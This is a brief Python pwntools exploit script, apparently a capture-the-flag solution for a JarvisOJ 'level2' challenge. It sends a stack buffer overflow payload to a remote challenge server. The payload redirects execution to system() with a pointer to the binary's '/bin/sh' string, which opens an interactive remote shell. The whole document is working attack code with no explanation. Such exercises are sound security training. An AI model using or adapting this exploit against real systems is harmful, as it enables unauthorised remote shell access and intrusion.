from pwn import *

conn = remote('pwn2.jarvisoj.com','9878')
elf = ELF('./level2.54931449c557d0551c4fc2a10f4778a1')

bin_sh = elf.search("/bin/sh").next()
system_addr = elf.symbols["system"]

payload = 'a' *(0x88  + 4)  + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh)

conn.recvline()
conn.sendline(payload)
conn.interactive()
